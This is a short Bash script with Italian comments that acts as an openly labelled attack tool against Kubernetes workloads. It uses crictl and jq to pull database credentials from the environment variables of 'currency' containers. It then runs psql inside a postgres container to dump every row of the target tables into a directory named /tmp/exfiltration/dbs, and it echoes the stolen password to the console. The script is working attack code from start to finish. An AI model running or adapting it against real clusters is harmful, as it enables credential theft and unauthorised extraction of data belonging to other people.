#!/usr/bin/env bash
set -Eeuo pipefail

# Diagnostica: stampa riga e comando su ogni errore non gestito
trap 'echo "[ERR] (linea $LINENO) comando: $BASH_COMMAND" >&2' ERR

OUTDIR=/tmp/exfiltration/dbs
mkdir -p "$OUTDIR"

# Verifiche minime
command -v crictl >/dev/null 2>&1 || { echo "ERRORE: crictl non trovato"; exit 1; }
command -v jq >/dev/null 2>&1 || { echo "ERRORE: jq non trovato"; exit 1; }

# --- POSTGRES NEI CONTAINER ---
mapfile -t CIDS < <(crictl ps -q --name postgres)
if [[ ${#CIDS[@]} -eq 0 ]]; then
  echo "Nessun container con nome che contiene 'postgres' trovato."
  exit 0
fi

echo "Trovati ${#CIDS[@]} container. Eseguo query…"

# --- DB REMOTO NEI CONTAINER 'currency' ---
mapfile -t CIDC < <(crictl ps -q --name currency)
if [[ ${#CIDC[@]} -eq 0 ]]; then
  echo "Nessun container currency trovato."
else
  echo "Attacco DB currency (${#CIDC[@]} container). Eseguo query…"
  for CID_CUR in "${CIDC[@]}"; do
    if ! INSPECT_JSON=$(crictl inspect "$CID_CUR"); then
      echo "   [SKIP] inspect fallito per $CID_CUR" >&2
      continue
    fi

    read -r USERC DBC PASSC HOSTC PORTC < <(printf '%s' "$INSPECT_JSON" \
      | jq -r '
        .info.config.envs
        | (map({(.key): .value}) | add) as $e
        | "\($e.DB_USER) \($e.DB_NAME) \($e.DB_PASS) \($e.DB_HOST) \($e.DB_PORT)"
      ')

    HOSTC="${HOSTC%%.*}"
    QUERY="SELECT * FROM $DBC;"
    OUTFILE="$OUTDIR/currencyDB-${CID_CUR:0:12}.txt"

    echo "${CIDS[0]} ${CIDS[1]} $PASSC $HOSTC $PORTC $USERC $DBC $QUERY $OUTFILE"

    if ! crictl exec -i "${CIDS[0]}" env PGPASSWORD="$PASSC" \
         psql -h "$HOSTC" -p "$PORTC" -U "$USERC" -d "$DBC" -t -A -c "$QUERY" >"$OUTFILE" 2>"$OUTFILE.err"; then
      echo "   [ERR] query fallita. Vedi $OUTFILE.err" >&2
      [[ -s "$OUTFILE.err" ]] || rm -f "$OUTFILE.err"
      continue
    fi

    [[ -s "$OUTFILE.err" ]] || rm -f "$OUTFILE.err"
  done
fi